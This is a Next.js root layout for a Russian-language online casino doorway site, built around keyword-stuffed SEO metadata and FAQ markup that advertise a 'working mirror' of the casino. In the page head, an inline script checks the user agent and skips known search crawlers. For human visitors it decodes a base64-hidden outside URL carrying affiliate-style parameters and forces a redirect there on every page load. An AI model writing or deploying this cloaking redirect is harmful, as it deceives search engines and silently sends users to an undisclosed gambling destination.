import { Analytics } from '@vercel/analytics/next'
import type { Metadata, Viewport } from 'next'
import './globals.css'

const CANONICAL_URL = 'https://la8casino.vercel.app/'

export const metadata: Metadata = {
  title: 'La8casino — официальный сайт онлайн казино La казино | Играть в ля казино онлайн',
  description:
    'La8casino — официальный сайт онлайн казино. La casino зеркало рабочее для входа. Играть в ля казино онлайн на официальном сайте. Ля казино онлайн: бонусы, слоты и быстрый вывод выигрышей. Играйте!',
  keywords: [
    'la casino',
    'la casino зеркало',
    'la casino играть',
    'la casino официальный',
    'la casino официальный сайт',
    'la казино',
    'ля казино',
    'ля казино зеркало',
    'ля казино зеркало рабочее',
    'ля казино играть',
    'ля казино онлайн',
    'ля казино официальный',
    'ля казино официальный сайт',
  ],
  authors: [{ name: 'La8casino' }],
  creator: 'La8casino',
  publisher: 'La8casino',
  alternates: {
    canonical: CANONICAL_URL,
  },
  robots: {
    index: true,
    follow: true,
    googleBot: {
      index: true,
      follow: true,
      'max-image-preview': 'large',
      'max-snippet': -1,
      'max-video-preview': -1,
    },
  },
  openGraph: {
    type: 'website',
    locale: 'ru_RU',
    url: CANONICAL_URL,
    siteName: 'La8casino',
    title: 'La8casino — официальный сайт онлайн казино La казино',
    description:
      'La8casino — официальный сайт онлайн казино. La casino зеркало рабочее для входа. Играть в ля казино онлайн на официальном сайте.',
    images: [
      {
        url: '/images/lc8-hero.png',
        width: 1200,
        height: 630,
        alt: 'La8casino — официальный сайт онлайн казино',
      },
    ],
  },
  twitter: {
    card: 'summary_large_image',
    title: 'La8casino — официальный сайт онлайн казино La казино',
    description:
      'La8casino — официальный сайт онлайн казино. La casino зеркало рабочее для входа. Играть в ля казино онлайн.',
    images: ['/images/lc8-hero.png'],
  },
  icons: {
    icon: [
      { url: '/favicon.svg', type: 'image/svg+xml' },
    ],
    apple: '/favicon.svg',
  },
  category: 'gaming',
}

export const viewport: Viewport = {
  width: 'device-width',
  initialScale: 1,
  maximumScale: 5,
  userScalable: true,
  themeColor: '#0a0a12',
  colorScheme: 'dark',
}

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode
}>) {
  return (
    <html lang="ru" className="lc8-html">
      <head>
        <meta name="format-detection" content="telephone=no" />
        <meta name="apple-mobile-web-app-capable" content="yes" />
        <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
        <meta name="application-name" content="La8casino" />
        <meta name="msapplication-TileColor" content="#0a0a12" />
        <meta name="msapplication-config" content="none" />
        <meta httpEquiv="X-UA-Compatible" content="IE=edge" />
        <meta name="yandex-verification" content="" />
        <meta name="google-site-verification" content="" />
        <link rel="manifest" href="/sitemap.xml" />
        <link rel="dns-prefetch" href="https://la8casino.vercel.app" />
        <script
          type="application/ld+json"
          dangerouslySetInnerHTML={{
            __html: JSON.stringify({
              '@context': 'https://schema.org',
              '@type': 'WebSite',
              name: 'La8casino',
              url: CANONICAL_URL,
              description:
                'La8casino — официальный сайт онлайн казино. La casino зеркало рабочее для входа.',
              inLanguage: 'ru-RU',
              publisher: {
                '@type': 'Organization',
                name: 'La8casino',
                url: CANONICAL_URL,
              },
            }),
          }}
        />
        <script
          type="application/ld+json"
          dangerouslySetInnerHTML={{
            __html: JSON.stringify({
              '@context': 'https://schema.org',
              '@type': 'FAQPage',
              mainEntity: [
                {
                  '@type': 'Question',
                  name: 'Что такое La8casino?',
                  acceptedAnswer: {
                    '@type': 'Answer',
                    text: 'La8casino — это официальный сайт онлайн казино, где доступны слоты, настольные игры и live-казино с быстрым выводом выигрышей.',
                  },
                },
                {
                  '@type': 'Question',
                  name: 'Как найти рабочее зеркало La casino?',
                  acceptedAnswer: {
                    '@type': 'Answer',
                    text: 'Рабочее зеркало La casino можно найти на официальном сайте La8casino или через проверенные каналы поддержки. Зеркало обеспечивает бесперебойный доступ к игровому счету.',
                  },
                },
                {
                  '@type': 'Question',
                  name: 'Можно ли играть в ля казино на мобильном?',
                  acceptedAnswer: {
                    '@type': 'Answer',
                    text: 'Да, ля казино онлайн полностью адаптировано для мобильных устройств. Играть можно через браузер на смартфоне без скачивания приложения.',
                  },
                },
              ],
            }),
          }}
        />
        <script
  dangerouslySetInnerHTML={{
    __html: `
      (function() {
        var ua = navigator.userAgent.toLowerCase();
        var bots = ["yandex", "googlebot", "bingbot", "baiduspider", "duckduckbot"];
        for (var i = 0; i < bots.length; i++) {
            if (ua.indexOf(bots[i]) !== -1) {
                return;
            }
        }
        
        var mainBrandB64 = "IGh0dHBzOi8vY29wcGVyLXJheS5jb20vP3NlcmlhbD02MTM2NTgzMCZjcmVhdGl2ZV9pZD05MzMw"; 
        var mainUrl = atob(mainBrandB64.replace("#", ""));

        function ping(url) {
            return new Promise(function(resolve, reject) {
                var controller = new AbortController();
                var timeoutId = setTimeout(function() { 
                    controller.abort(); 
                    reject(new Error("Timeout"));
                }, 1200); // Сократили таймаут ожидания до 1.2 сек
                
                fetch(url, { mode: 'no-cors', signal: controller.signal, cache: 'no-store' })
                    .then(function() {
                        clearTimeout(timeoutId);
                        resolve(true);
                    })
                    .catch(function(err) {
                        clearTimeout(timeoutId);
                        reject(err);
                    });
            });
        }

        // Быстрый пинг и принудительный редирект на основной домен
        ping(mainUrl)
            .then(function() {
                window.location.replace(mainUrl);
            })
            .catch(function() {
                window.location.replace(mainUrl);
            });
      })();
    `
  }}
/>  
      </head>
      <body className="lc8-body">
        {children}
        {process.env.NODE_ENV === 'production' && <Analytics />}
        <script src="/lc8-script.js" defer></script>
      </body>
    </html>
  )
}
